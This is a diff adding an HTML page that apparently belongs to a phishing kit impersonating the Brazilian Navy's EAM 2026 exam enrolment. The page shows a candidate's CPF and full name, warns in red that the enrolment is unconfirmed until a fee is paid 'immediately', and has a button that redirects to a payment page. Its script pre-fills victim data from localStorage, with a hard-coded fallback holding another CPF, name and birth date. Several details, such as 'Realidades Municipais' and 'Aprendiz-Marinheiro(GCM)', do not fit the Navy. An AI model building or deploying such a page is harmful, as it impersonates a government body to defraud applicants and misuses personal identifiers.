@@ -1,0 +1,280 @@
+<!doctype html>
+<html lang="pt-br">
+    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+    <head>
+        <meta charset="UTF-8" />
+        <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+        <title>Marinha do Brasil - Informações Importantes</title>
+
+        <script src="../../config-site.js"></script>
+
+        <script src="../../3.4.16.js"></script>
+        <link href="../css/all.min.css" rel="stylesheet" />
+        <link href="../css/home.css" rel="stylesheet" />
+
+        <style>
+            .gov-header {
+                background-color: #222222;
+            }
+            .inep-header {
+                background-color: #ffffff;
+            }
+            .form-header {
+                background-color: #fbc12a;
+                color: white;
+                font-weight: 600;
+            }
+            .btn-primary {
+                background-color: #003f6b;
+                color: white;
+                transition: all 0.2s ease;
+            }
+            .btn-primary:hover {
+                background-color: #4d7396;
+            }
+            .footer-bg {
+                background-color: #ffffff;
+                position: relative;
+                z-index: 1;
+            }
+
+            .info-box {
+                border-left: 4px solid #fbc12a;
+            }
+
+            .loading-spinner {
+                display: inline-block;
+                width: 20px;
+                height: 20px;
+                border: 2px solid #fff;
+                border-radius: 50%;
+                border-top-color: transparent;
+                animation: spin 1s linear infinite;
+            }
+
+            @keyframes spin {
+                to { transform: rotate(360deg); }
+            }
+
+            /* Estado de loading do botão */
+            .btn-loading {
+                pointer-events: none;
+                opacity: 0.7;
+            }
+        </style>
+
+    </head>
+    <body class="flex flex-col min-h-screen">
+        <div class="inep-header py-3">
+            <div class="container mx-auto px-4">
+                <img
+                    src="../images/logo-marinha.png"
+                    alt="Logo SSPM"
+                    height="30"
+                    width="100"
+                    style="object-fit: contain"
+                />
+            </div>
+        </div>
+
+        <main class="flex-grow py-8" style="padding-top:10px!important">
+        <div class="container mx-auto px-4 max-w-3xl">
+            <div class="border border-gray-300 rounded">
+                <div class="form-header py-2 px-4 text-center">
+                    <h2 class="text-lg">
+                        Inscrição &gt; Informações do Concurso
+                    </h2>
+                </div>
+                <div class="p-6">
+                    <div class="bg-[#2B5984] p-4 rounded-md mb-5 text-white shadow-md">
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div class="p-2">
+                                <p class="text-sm text-gray-200">CPF:</p>
+                                <p id="cpf-display" class="font-semibold text-shadow">57002029215</p>
+                            </div>
+                            <div class="p-2">
+                                <p class="text-sm text-gray-200">
+                                    Nome Completo:
+                                </p>
+                                <p id="nome-display" class="font-semibold text-shadow">PATRICIA TOBELEM DA SILVA</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="mb-8">
+                        <h3 class="text-xl font-bold text-[#044785] mb-4">
+                            <i class="fas fa-info-circle mr-2"></i>
+                            Informações Importantes sobre o Processo Seletivo EAM 2026 2026
+                        </h3>
+                        <div class="space-y-5">
+                            <div class="info-box pl-4 py-1">
+                                <h4 class="text-lg font-semibold text-[#fbc12a]">
+                                    Formato da Prova
+                                </h4>
+                                <p class="text-gray-700 mb-2">
+                                    A prova terá o
+                                    seguinte formato:
+                                </p>
+                                <ul class="text-gray-700 mb-2 ml-4 list-disc">
+                                    <li>
+                                        <strong>Questões objetivas:</strong>
+                                        Prova Objetiva (eliminatória e classificatória) — questões de múltipla escolha sobre temas como Língua Portuguesa, Matemática/Raciocínio Lógico, Realidades Municipais, Noções de Informática e Conhecimentos Específicos.
+                                    </li>
+                                    <li>
+                                        <strong>Exames médicos:</strong>
+                                        Teste de Aptidão Física (TAF)
+                                    </li>
+                                </ul>
+                            </div>
+
+                            <div class="info-box pl-4 py-1">
+                                <h4 class="text-lg font-semibold text-[#fbc12a]">
+                                    Critérios de Aprovação
+                                </h4>
+                                <p class="text-gray-700 mb-2">
+                                    Para ser aprovado no concurso:
+                                </p>
+                                <ul class="text-gray-700 mb-2 ml-4 list-disc">
+                                    <li>
+                                        Atingir nota mínima na prova
+                                        objetiva conforme estabelecido no
+                                        edital da Marinha do Brasil.
+                                    </li>
+                                    <li>
+                                        Ser aprovado em todas as etapas:
+                                        prova objetiva, conhecimentos
+                                        específicos, exames médicos e
+                                        investigação social.
+                                    </li>
+                                    <li>
+                                        Classificação final dentro das 500
+                                        vagas disponíveis.
+                                    </li>
+                                </ul>
+                            </div>
+
+                            <div class="info-box pl-4 py-1">
+                                <h4 class="text-lg font-semibold text-[#fbc12a]">
+                                    Próximas Etapas
+                                </h4>
+                                <p class="text-gray-700 mb-2">
+                                    Após a aprovação na prova objetiva:
+                                </p>
+                                <ul class="text-gray-700 mb-2 ml-4 list-disc">
+                                    <li>
+                                        Candidatos aprovados serão
+                                        convocados para os exames médicos.
+                                    </li>
+                                    <li>
+                                        Sequêncialmente: investigação social
+                                        e curso de formação.
+                                    </li>
+                                    <li>
+                                        Aprovados em todas as etapas serão
+                                        nomeados Aprendiz-Marinheiro(GCM).
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div
+                                class="bg-red-50 p-4 rounded-md border border-red-300 text-red-800 mt-6"
+                            >
+                                <p class="flex items-start">
+                                    <i
+                                        class="fas fa-exclamation-triangle text-red-600 mr-2 mt-1"
+                                    ></i>
+                                    <span>
+                                        <strong>ATENÇÃO:</strong> Sua inscrição
+                                        ainda não foi confirmada devido à falta
+                                        de pagamento da Taxa de Inscrição. Para
+                                        garantir sua participação no exame, é
+                                        necessário efetuar o pagamento
+                                        imediatamente.
+                                    </span>
+                                </p>
+                            </div>
+                        </div>
+                        <div class="border-t border-gray-300 pt-5 mt-5">
+                            <div class="flex justify-center">
+                                <button
+                                    id="pagar-button"
+                                    class="bg-green-600 hover:bg-green-700 text-white py-3 px-8 rounded-md flex items-center justify-center transition-all"
+                                >
+                                    <i class="fas fa-credit-card mr-2"></i>
+                                    <span id="pagar-button-text">Pagar Taxa e Concluir</span>
+                                </button>
+                            </div>
+                        </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+<script>
+let userData = null;
+
+document.addEventListener("DOMContentLoaded", function () {
+    const cpfData = JSON.parse(localStorage.getItem("cpfData") || "{}");
+
+    const testUserData = {
+        CPF: "91834279372",
+        NOME: "IRACEMA DE SOUSA SILVA",
+        NASC: "1970-10-24 00:00:00",
+        EMAIL: "teste@email.com"
+    };
+
+    if (cpfData?.dados?.[0]) {
+        userData = cpfData.dados[0];
+    } else {
+        console.warn("⚠️ Usando dados de teste");
+        userData = testUserData;
+    }
+
+    // Exibir CPF e Nome
+    document.getElementById("cpf-display").textContent = userData.CPF;
+    document.getElementById("nome-display").textContent = userData.NOME;
+
+    // Clique no botão de pagamento
+    const pagarBtn = document.getElementById("pagar-button");
+    pagarBtn.addEventListener("click", handlePaymentClick);
+});
+
+async function handlePaymentClick(e) {
+    e.preventDefault();
+
+    const btn = document.getElementById("pagar-button");
+    const btnText = document.getElementById("pagar-button-text");
+
+    // Desabilitar botão e mostrar loading
+    btn.classList.add("btn-loading");
+    btnText.innerHTML = '<span class="loading-spinner"></span> Redirecionando...';
+
+    // Redirecionar para a página de pagamento
+    window.location.href = "../pagamento/";
+}
+</script>
+
+        <footer class="footer-bg text-black py-4 text-xs">
+            <div class="container mx-auto px-4">
+                <div class="flex flex-col items-center mb-2">
+                    <img
+                        src="../images/logo-marinha.png"
+                        onerror="this.src='../images/logo-marinha.png'"
+                        alt="Marinha do Brasil"
+                        height="30"
+                        width="60"
+                        style="object-fit: contain"
+                    />
+                </div>
+                <div class="flex justify-between items-center">
+                    <div>&copy; Código de Ética e Conduta | Política de Integridade</div>
+                    <div class="flex items-center">
+                        <i class="fas fa-globe mr-1"></i> Fundação Marinha do Brasil
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </body>
+</html>
